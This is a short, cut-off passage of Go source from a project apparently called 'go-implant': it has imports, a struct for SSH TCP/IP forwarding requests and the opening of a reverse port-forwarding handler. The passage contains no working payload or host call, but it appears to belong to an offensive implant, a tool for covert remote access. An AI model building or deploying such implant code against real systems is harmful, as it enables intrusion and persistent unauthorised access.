// +build !windows

// is this needed???

package ssh

import (
	"go-implant/client/config"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

type tcpIPForwardRequest struct {
	AddressToBind    string
	PortNumberToBind uint32
}

func serveReversePortForward(connection ssh.Channel, stopchannel chan struct{}) {

	log.Printf("in serveReversePortF